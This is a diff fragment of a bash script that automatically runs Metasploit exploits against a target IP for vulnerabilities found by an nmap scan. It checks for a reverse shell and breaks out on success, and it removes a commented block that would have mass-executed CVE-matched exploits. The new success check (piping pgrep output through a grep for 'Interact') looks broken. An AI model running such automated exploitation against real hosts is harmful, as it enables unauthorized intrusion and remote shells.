@@ -161,12 +161,11 @@ while read vuln; do
                     echo "Using exploit $exploit"
                     msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" &
                     sleep 10 # Wait for the exploit to execute
-                    if pgrep msfconsole > /dev/null
+                    if pgrep msfconsole | grep -q "Interact" > /dev/null
                     then
                         echo "Exploited vulnerability $vuln using exploit $exploit"
                         exploitsFound=1
                         exploit_executed=true
-                        session_id=$(msfconsole -x "sessions -l | grep '.*shell.*'" | awk '{print $1}') # get session ID of reverse shell
                         break 2 # break out of both loops when an exploit is successfully executed
                     else
                         echo "Failed to exploit vulnerability $vuln using exploit $exploit"
@@ -207,16 +206,3 @@ then
     echo "No exploits found"
     exit
 fi
-
-# Execute discovered exploits (use with caution and proper authorization!)
-#read -p "Would you like to execute discovered exploits (y/n)? " executeExploits
-#if [[ $executeExploits =~ ^[yY]$ ]]; then
-#    while read -r line
-#    echo "\033[31m$line\033[0m"
-#    do
-#        exploitPath=$(echo "$line" | cut -d ":" -f 1)
-#        exploitName=$(echo "$line" | cut -d ":" -f 2)
-#        echo "Executing $exploitName..."
-#        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; run; exit;"
-#    done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+' nmap-scan.txt)"
-#fi
